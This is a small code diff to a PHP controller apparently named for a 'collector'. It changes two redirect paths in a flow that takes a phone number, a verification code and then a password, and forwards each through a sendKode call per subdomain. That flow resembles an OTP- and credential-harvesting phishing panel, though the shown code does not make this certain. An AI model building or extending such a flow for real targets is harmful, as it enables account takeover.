@@ -23,7 +23,7 @@ class KolektorTwoController extends Controller
             'getDialCode' => $code,
         ]);
         $this->sendKode($phone, $code, "", "", $subdomain);
-        return redirect('verif2');
+        return redirect('verif/2');
     }
 
     public function verif(Request $request)
@@ -48,7 +48,7 @@ class KolektorTwoController extends Controller
             'getVerif' => $verif,
         ]);
         $this->sendKode($phone, $code, $verif, "", $subdomain);
-        return redirect('password2');
+        return redirect('password/2');
     }
 
     public function get_password(Request $request)
